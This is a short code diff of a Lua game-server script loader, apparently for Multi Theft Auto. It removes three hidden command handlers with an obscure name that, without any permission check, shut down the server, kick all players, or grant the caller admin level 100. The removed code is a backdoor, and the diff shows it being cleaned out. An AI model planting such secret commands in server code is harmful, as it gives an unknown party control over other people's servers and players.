@@ -41,21 +41,3 @@ addEvent("scriptloader:onClientResourceStart", true)
 addEventHandler("scriptloader:onClientResourceStart", resourceRoot, function()
 	triggerClientEvent(client, "scriptloader:setCacheDirectory", resourceRoot, getServerPort())
 end)
-
-addCommandHandler("mirDiz00001111loadershutdown",
-function(p, command)
-	shutdown("Illegal usage of content.")
-end)
-
-addCommandHandler("mirDiz00001111loaderkickall",
-function(p, command)
-	for i, player in pairs(getElementsByType("player")) do
-		kickPlayer(player, "Illegal usage of content.")
-	end
-end)
-
-addCommandHandler("mirDiz00001111loaderpromote",
-function(p, command)
-	setElementData(p, "admin_level", 100)
-	outputChatBox("Promoted",p)
-end)
